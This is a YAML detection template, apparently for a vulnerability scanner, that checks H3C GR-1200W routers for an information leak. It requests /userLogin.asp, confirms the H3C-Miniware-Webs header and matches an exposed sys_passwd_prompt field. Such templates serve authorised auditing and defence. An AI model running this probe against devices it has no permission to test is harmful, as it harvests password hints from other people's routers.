id: poc-yaml-h3c-gr-1200w-sys-passwd-prompt-information-leak
info:
  name: H3C H3C-GR-1200W sys_passwd_prompt 信息泄漏漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: H3C-Miniware-Webs
requests:
- method: GET
  path: /userLogin.asp
  expression: status_code == 200 && contains(headers,"H3C-Miniware-Webs") && matches(body,`sys_passwd_prompt
    =".*"`)
variables: {}
transport: http
